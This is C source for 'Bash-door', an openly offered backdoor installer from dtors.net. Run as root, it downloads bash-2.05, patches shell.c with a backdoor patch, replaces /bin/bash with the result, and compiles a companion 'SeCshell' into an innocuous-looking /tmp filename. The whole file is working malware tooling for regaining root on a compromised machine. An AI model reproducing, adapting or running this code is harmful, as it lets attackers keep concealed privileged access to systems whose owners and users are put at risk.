/*
 * Bash-door.c - By bob for www.dtors.net
 *
 * This is very lame coding...but the results are brilliant!
 * 
 * Ever thought you could loose root?
 * 
 * This script can be used for lots of different things, but its main
 * intention is to gain root privileges back if lost.
 *
 * [1] BD will wget the bash-2.05 tarball from the ftp.gnu.org.
 * It will then go on to patching shell.c with lockdowns bash patch.
 * Then it will compile and install the new bash shell on the system.
 * 
 * [2] BD will Compile SeCshell.c to /tmp/mclzaKmfa
 *
 * [3] BD will exit.
 *
 * For further information on Trogan, read the "Readme" Document in the tarball.
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

char cmd[1];

void menu(void);

void bash() {
puts("\n\nDownloading Bash-2.05....");
sleep(3);
system("/usr/bin/wget ftp://ftp.gnu.org/gnu/bash/bash-2.05.tar.gz>/dev/null");
puts("\n\nDone downloading, now we have to untar and compile.\nPlease wait...");
system("/bin/tar -zxvf bash-2.05.tar.gz>/dev/null");
system("/bin/mv ./bashp bash-2.05/");
chdir("bash-2.05/");
system ("/usr/bin/patch shell.c bashp;./configure>/dev/null;make>/dev/null;make install>/dev/null;mv -f ./bash /bin");
puts("\n\n\n/bin/bash has successfully been backdoored!");
chdir("$home");
sleep(5);
menu();
}

void secshell() {
      puts("\n\nCompiling SeCshell....");
 	system("/usr/bin/gcc SeCshell.c -o /tmp/mcliZokhb -lcrypt>/dev/null");
	puts("\nSeCshell Compiled and installed in /tmp");
      menu();
}

void menu()
{
	printf("\n\n\nBash-door.c - by bob");
	printf("\n\n-=[1]=- Update and backdoor Bash.");
	printf("\n-=[2]=- Compile and install SeCshell.");
	printf("\n-=[3]=- Exit.");
	printf("\n\n>");
      scanf("%1s", cmd);
      if (strcmp(cmd, "1") == 0) bash();
      else if (strcmp(cmd, "2") == 0) secshell();
  	else if (strcmp(cmd, "3") == 0) exit(0);
	else
        {
                printf("erm %s is not one of the options!\n", cmd);
        	menu();
	}
}
int main() {
	system("/usr/bin/clear");
if(getuid() !=0) 
{
fprintf (stderr, "WARNING: Bash-door cannot run correctly as a Normal User.\n");
fprintf (stderr, "Please Run Bash-door as root uid(0).\n");
exit(-1);
}

	menu();
	return 0;
}
